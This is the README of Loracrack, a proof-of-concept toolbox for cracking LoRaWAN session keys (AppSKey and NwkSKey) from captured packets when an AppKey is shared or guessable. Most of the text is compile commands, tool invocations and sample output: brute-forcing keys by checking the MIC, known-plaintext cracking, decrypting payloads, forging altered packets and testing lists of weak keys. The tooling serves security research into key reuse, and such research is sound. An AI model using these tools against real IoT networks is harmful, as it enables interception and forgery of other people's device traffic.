## Loracrack - LoRaWAN session cracker
##### A PoC for exploiting weak or shared Application Keys
Created by Sipke Mellema of Applied Risk, modified by Vincent Lopes & Julien Fink of digital.security

This is a Proof-of-Concept for demonstrating the dangers of using the same AppKey on multiple LoRaWAN nodes.

This repository holds a toolbox for cracking LoRaWAN session keys (AppSKey and NwkSKey) from captured packets. The attack scenario assumes you know the AppKey but missed the handshake. Or the AppKeyAppSKey/NwkSKey isn't random and can be guessed.

LoRa handshakes use three values to generate the session keys:
`AppNonce | NetID | DevNonce`
AppNonce and NetID are 3 bytes, and DevNonce is 2 bytes. Part of the NetID is known, so that leaves 57-bit entropy. And because of implementation flaws this can get way lower.

### Compiling and usage
Just `make` it. Note that you may have to link to an openssl 1.1.* location in the Makefile.

### Overview of tools

#### loracrack
`./loracrack -k <AppKey in hex> -p <raw_packet in hex> -v <0, 1 or 2>`

Cracks session keys if handshake (join-accept) is missed but AppKey is known. Cracking is done by generating session keys and checking the MIC.

```$ gcc loracrack.c includes/*.c -o loracrack -lpthread -lcrypto -O3
$ ./loracrack -k 88888888888888888888888888888888 -p 400267bd018005000142d9f48c52ea717c57 -v 1

4899be88e40088c40abc703fa3ba1195 04068f88b9feee5385c67e033d911b4a
```
```
Optional arguments:
	-t threads
	-v verbose (0, 1 or 2)
	-m maximum AppNonce
```

#### loracrack_knownpt
`./loracrack_knownpt -k <AppKey in hex> -p <raw_packet in hex> -d <plain_text in hex> -v <0, 1 or 2>`

Cracks session keys if handshake (join-accept) is missed but AppKey and plaintext are known. Cracking is done by decrypting the FRMPayload and checking the plaintext. It's faster than checking the MIC, since the CMAC uses more AES operations.

```$ gcc loracrack_knownpt.c includes/*.c -o loracrack_knownpt -lpthread -lcrypto -O3
$ ./loracrack_knownpt -k 88888888888888888888888888888888 -p 400267bd018005000142d9f48c52ea717c57 -d 33302e3332 -v 0

4899be88e40088c40abc703fa3ba1195 04068f88b9feee5385c67e033d911b4a
```
```
Optional arguments:
	-t threads
	-v verbose (0, 1 or 2)
	-m maximum AppNonce
```

#### loracrack_decrypt
`./loracrack_decrypt -k <decrypt key in hex> -p <raw_packet in hex>`

Decrypts packet data if session key is known.

```$ gcc loracrack_decrypt.c includes/*.c -o loracrack_decrypt -lcrypto -O3
$ ./loracrack_decrypt -k 4899be88e40088c40abc703fa3ba1195 -p 400267bd018005000142d9f48c52ea717c57

33302e3332
```

#### loracrack_alterpacket
`./loracrack_alterpacket -p <raw_packet in hex> -a <AppSKey in hex> -n <NwkSKey in hex> -c <Fctn> -d <new data in hex>`

Alters packet with new data, keeps old things like DeviceAddr.

```$ gcc loracrack_alterpacket.c includes/*.c -o loracrack_alterpacket -O3 -lcrypto
$ ./loracrack_alterpacket -p 400267bd018005000142d9f48c52ea717c57 -a 4899be88e40088c40abc703fa3ba1195 -n 04068f88b9feee5385c67e033d911b4a -c 5 -d 33302d3332

400267bd018005000142d9f78c521c78573b
```

#### loracrack_genkeys
`./loracrack_genkeys -k <AppKey in hex> -j <join_packet in hex> -a <accept_packet in hex> -v <0 or 1>`

Generates session keys given handshake (join and accept packets) and AppKey.

```$ gcc loracrack_genkeys.c includes/*.c -o loracrack_genkeys -lcrypto -O3
$ ./loracrack_genkeys -k 88888888888888888888888888888888 -j 0000000000000000002bd61f000ba304000e1ba147157a -a 20adf6e18980952590fc1f7987a6913f35 -v 0

4e1dcaf4f02fcd2ecbb1cb0d138fc53d 96eb9e13f0a3468ca580707ee688ee19
```
```
Optional arguments:
	-v verbose (0, 1)
```

#### loracrack_guessjoin
`./loracrack_guessjoin -p <raw_packet in hex> -f <file with AppKeys in hex> -v <0, 1 or 2>`

Checks if predictable AppKeys are used by checking the MIC on a join packet. AppKeys are taken from a file with hex-encoded AppKeys on new lines.

```$ gcc loracrack_guessjoin.c includes/*.c -o loracrack_guessjoin -lcrypto -O3
$ ./loracrack_guessjoin -p 0000000000000000002bd61f000ba304002f3b5785cf80 -f simplekeys -v 0

88888888888888888888888888888888
```
```
Optional arguments:
	-v verbose (0, 1, 2)
```

#### loracrack_testNwkSKeys
`./loracrack_testNwkSKeys -p <raw_packet in hex> -f <file with NwkSKeys in hex> -v <0 or 1>`

Checks if predictable NwkSKeys are used by checking the MIC on a packet. NwkSKeys are taken from a file with hex-encoded NwkSKeys on new lines.

```$ gcc loracrack_testNwkSKeys.c includes/*.c -o loracrack_testNwkSKeys -lcrypto -O3 -Wall -ldl
$ ./loracrack_testNwkSKeys -p 40F17DBE4900020001954378762B11FF0D -f simplekeys -v 0

MIC matches with possible NwkSKey --> 44024241ed4ce9a68c6a8bc055233fd3
```
```
Optional arguments:
	-v verbose (0, 1)
```